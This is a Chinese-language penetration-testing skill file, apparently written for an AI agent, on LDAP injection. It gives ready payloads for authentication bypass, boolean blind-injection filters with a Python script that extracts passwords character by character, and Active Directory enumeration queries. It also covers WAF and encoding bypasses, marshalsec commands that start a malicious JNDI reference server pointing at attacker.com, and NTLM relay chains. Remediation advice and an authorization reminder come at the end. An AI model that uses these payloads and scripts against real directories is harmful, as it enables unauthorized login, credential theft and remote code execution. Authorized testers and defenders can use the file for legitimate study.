---
name: ldap-injection-testing
description: LDAP注入深度测试技能：认证绕过、信息枚举、盲注、RCE（Log4Shell类JNDI）、LDAP过滤器注入、Active Directory攻击
version: 2.0.0
---

# LDAP注入深度测试技能

## 概述

LDAP（轻量级目录访问协议）注入类似于SQL注入，攻击者通过注入LDAP过滤器特殊字符修改查询逻辑，导致认证绕过、信息泄露、权限提升。结合JNDI注入可实现RCE（如Log4Shell）。本技能覆盖LDAP过滤器注入、盲注技术、Active Directory特定攻击、编码绕过、JNDI RCE利用链。

## 一、LDAP注入攻击面

### 1.1 注入点
| 场景 | 典型功能 |
|------|---------|
| 用户登录认证 | `(&(cn=user)(password=pwd))` |
| 用户搜索/查找 | `(cn=*keyword*)` |
| 组织结构查询 | Active Directory用户/组查询 |
| SSO/单点登录 | LDAP认证后自动登录 |
| 邮箱地址查找 | `(mail=*@domain.com)` |
| 员工目录查询 | 内部通讯录 |
| 权限检查 | `(&(uid=user)(memberOf=admins))` |
| 设备注册 | IoT设备LDAP认证 |
| OAuth/LDAP绑定 | 第三方认证 |

### 1.2 LDAP过滤器特殊字符
```
字符   URL编码    含义
&      %26       AND
|      %7c       OR
!      %21       NOT
=      %3d       等于
<      %3c       小于
>      %3e       大于
,      %2c       多值分隔
+      %2b       加号（需要的DN属性）
"      %22       双引号
\      %5c       转义符
;      %3b       分号
/      %2f       路径分隔
#      %23       井号（Hex编码开头）
*      %2a       通配符
()     %28%29    括号
NUL    %00       空字节
空格   %20       空格
```

未转义这些字符直接拼接即存在注入。

## 二、LDAP基础语法

### 2.1 过滤器语法
```
(attr=value)                  等于
(attr=*value*)                包含
(attr>=value)                 大于等于
(attr<=value)                 小于等于
(attr~=value)                 近似匹配
(&(a=1)(b=2))                 AND
(|(a=1)(b=2))                 OR
(!(a=1))                      NOT
(objectClass=*)               匹配所有
(attr=*)                      存在attr属性
(!(attr=*))                   attr属性不存在
```

### 2.2 LDAP URL格式
```
ldap://host:port/DN?attributes?scope?filter?extensions
ldap://target.com/dc=example,dc=com?cn,mail?sub?(uid=admin)
```

## 三、认证绕过

### 3.1 经典认证绕过
原始查询：`(&(cn=INPUT_USER)(password=INPUT_PASS))`

```
用户名输入：admin)(&))   → 过滤器变为 (&(cn=admin)(&))(password=x))
                          第一个过滤器闭合后(&)永真，返回admin
密码输入：*             → (&(cn=admin)(password=*)) 匹配任何密码
用户名：*               → (&(cn=*)(password=*)) 返回第一个用户
用户名：admin)(|(password=*   → (&(cn=admin)(|(password=*)(password=x))
用户名：*)(|(cn=*     → (&(cn=*)(|(cn=*)(password=x)) → 返回所有用户
密码：*
用户名：admin%00      → 空字节截断密码检查（老版本）
用户名：(cn=*)
密码：*
```

### 3.2 AND/OR注入
```
# 绕过登录（永真条件）
username: *)|(cn=*))%00
password: anything
过滤器：(&(cn=*)|(cn=*))%00)(password=anything))
# 第一个OR条件永真，%00截断后面

# 管理员登录
username: admin)(|(password=*))
password: anything

# 模糊匹配
username: adm*
password: *
```

### 3.3 Blind LDAP注入
与SQL盲注类似，通过TRUE/FALSE差异逐字符提取：
```
# 布尔盲注
(cn=admin)(password=*) → TRUE（登录成功）
(cn=admin)(&(password=a*)) → 检查密码是否以a开头
(cn=admin)(&(password=b*)) → ...
二分法逐字符爆破密码

# 语法：
(&(cn=admin)(&(passwordChar=CHARACTER_PLACEHOLDER*)))
# 或通过AND追加条件判断是否成立
```

## 四、信息枚举

### 4.1 通配符枚举
```
# 枚举用户
(cn=*)            → 所有有cn属性的对象
(cn=a*)           → cn以a开头
(cn=?a*)          → ?是单字符通配符？不，LDAP只用*
(uid=*)           → 所有uid
(objectClass=user)→ 所有user对象
(objectClass=person)
(mail=*@*)        → 有邮箱的用户
(userPassword=*)  → 有密码的对象
(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local)  → 域管理员
```

### 4.2 属性枚举
```
# 列出已知属性
cn, sn, givenName, mail, telephoneNumber, mobile, uid, userPassword
memberOf, whenCreated, lastLogon, accountExpires, badPwdCount, logonCount
distinguishedName, objectSid, sAMAccountName, servicePrincipalName (SPN)
userAccountControl, primaryGroupID, description, info, comment
```

### 4.3 Active Directory信息收集
```
# 用户枚举
(sAMAccountName=*)
(sAMAccountType=805306368)  # 普通用户
(userAccountControl:1.2.840.113556.1.4.803:=2)  # 禁用账户
(!(userAccountControl:1.2.840.113556.1.4.803:=2)) # 启用账户

# 组枚举
(objectCategory=group)

# 域管理员
(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=domain,DC=local)

# SPN服务账号（Kerberoasting目标）
(servicePrincipalName=*)
```

## 五、绕过技术

### 5.1 编码绕过
```
# URL编码特殊字符
( → %28
) → %29
* → %2a
& → %26
| → %7c
! → %21
= → %3d

# 双重URL编码
( → %2528

# Unicode编码
\u0028 → (
\x28   → (
%u0028 → (

# DN特殊字符转义
# DN中需要转义：+,;<>=\#"
# 例如: CN=James\2CJohn (逗号转义为\2C)

# 空格绕过
# 某些LDAP服务器允许在过滤器中使用注释或多余空格
```

### 5.2 过滤器绕过WAF
```
# 注释/空白填充：LDAP过滤器不支持注释，但可以在括号内插入空格
(  cn = * )
(cn=*)(|(password=*))

# 通配符变形
cn=ad*in → ad开头in结尾
cn=*dmi* → 包含dmi
cn=a?min  （非标准，部分服务器支持）

# 多条件组合绕过
(&(cn=admin)(!(cn=admin))(cn=admin))  # 双重否定绕过简单检测
```

### 5.3 LDAP查询截断
```
# 空字节截断（老版本C实现）
(cn=admin%00)(password=anything)
# 部分LDAP服务器在NUL处终止过滤器

# 注释截断（若后端拼接）
(cn=admin)#)(password=anything)
```

## 六、高级利用

### 6.1 JNDI注入（Log4Shell类似）
LDAP可返回序列化对象或JNDI引用导致RCE：
```
# 恶意LDAP服务器
# 当应用使用InitialContext.lookup("ldap://attacker.com/obj")时触发
# 1. 返回Reference指向远程class
# 2. 返回序列化Gadget对象
# 3. marshallc/njRAT等工具搭建恶意LDAP服务器

# 工具
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit"
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/#Exploit"
```

### 6.2 LDAP Relay（中继攻击）
```
# NTLM Relay到LDAP（PrivExchange等）
# 通过PetitPotam/PrinterBug coerce认证中继到LDAPS启用RBAC/Resource-Based Constrained Delegation
# PetitPotam → NTLM Relay to LDAP → 机器账户权限提升
```

### 6.3 LDAP注入提权
```
# 修改memberOf属性（如果有修改权限）
# 注入修改查询返回管理员组
# 通过LDAP添加用户到管理员组

# 密码重置（需写权限）
# 某些LDAP查询配合UPDATE/MODIFY权限（少见）
```

### 6.4 盲注数据提取脚本思路
```python
import requests, string

# 布尔盲注：逐字符提取
charset = string.ascii_letters + string.digits + '_@.'
found = ""
for pos in range(1, 50):
    for c in charset:
        payload = f"admin)(&(password={found}{c}*"
        r = requests.post(target, data={"username": payload, "password": "x"})
        if "Login success" in r.text:
            found += c
            print(found)
            break
    else:
        break
```

## 七、工具链

| 工具 | 用途 |
|------|------|
| ldapsearch | 命令行LDAP查询 |
| Apache Directory Studio | GUI LDAP浏览器 |
| JXplorer | LDAP浏览器 |
| Nmap ldap-search NSE | 枚举LDAP |
| Nmap ldap-brute | LDAP爆破 |
| enum4linux-ng | AD/Linux LDAP枚举 |
| BloodHound | AD关系分析 |
| Impacket GetNPUsers/GetUserSPNs | Kerberos攻击 |
| Burp Suite | 代理手动测试 |
| LDAP Fuzzer | fuzz注入点 |
| marshalsec/JNDI-Injection-Exploit | JNDI RCE服务器 |
| ldapdomaindump | AD信息导出 |
| windapsearch | AD LDAP枚举 |

### ldapsearch使用
```bash
# 匿名绑定
ldapsearch -h target -x -b "dc=domain,dc=local"
# 认证查询
ldapsearch -h target -D "cn=admin,dc=domain,dc=local" -w password -b "dc=domain,dc=local"
# 枚举用户
ldapsearch -h target -x -b "dc=domain,dc=local" "(objectClass=person)" cn mail
# Active Directory枚举
ldapsearch -h dc.target.com -x -b "DC=target,DC=com" "(sAMAccountName=*)" sAMAccountName
```

## 八、LDAP测试清单

- [ ] 所有接受LDAP查询参数的接口（登录/搜索/目录）
- [ ] LDAP特殊字符注入（*)(|&!>=<*）
- [ ] 认证绕过（永真条件/空密码）
- [ ] 通配符枚举（*、objectClass=*、cn=*）
- [ ] 盲注数据提取（密码/属性）
- [ ] 属性枚举（cn/mail/memberOf/userPassword）
- [ ] AND/OR/NOT逻辑注入
- [ ] Active Directory特定（SPN/域管理员/禁用账户）
- [ ] 编码绕过（URL/Unicode/双重编码）
- [ ] 空字节截断
- [ ] DN特殊字符转义绕过
- [ ] LDAP URL参数注入
- [ ] 匿名绑定枚举
- [ ] 暴力破解（用户名+密码）
- [ ] 默认凭证（admin/admin、cn=Manager等）
- [ ] JNDI注入点（lookup/logging）
- [ ] LDAP Relay场景
- [ ] LDAP签名/通道绑定检查
- [ ] 敏感属性读取（userPassword/description中的密码）

## 九、修复建议

- **使用参数化LDAP API**：使用LDAP库的参数化查询，不要拼接字符串
- **特殊字符转义**：使用库函数转义过滤器和DN中的特殊字符
- **最小权限绑定**：LDAP绑定账号使用最小权限，避免管理员权限
- **匿名绑定禁用**：禁止匿名LDAP查询
- **输入白名单**：用户名等严格白名单（字母数字+下划线）
- **LDAP签名**：启用LDAP签名防止Relay
- **安全通道绑定**：EPA/CBT防止中继
- **错误处理**：不返回LDAP错误详情
- **认证分离**：认证与查询分离，不直接构造AND过滤器
- **使用SASL/简单绑定**：使用标准认证机制而非自定义逻辑
- **敏感属性保护**：限制userPassword等敏感属性的读取权限

## 注意事项

- **仅限授权测试**：LDAP目录通常存储用户凭证，测试需严格授权
- **匿名绑定风险**：允许匿名绑定时可枚举大量信息
- **AD环境注意**：Active Directory测试可能影响域环境
- **JNDI注入**：LDAP返回恶意对象可直接RCE，影响严重
- **合规要求**：遵守《网络安全法》，仅在授权范围内测试
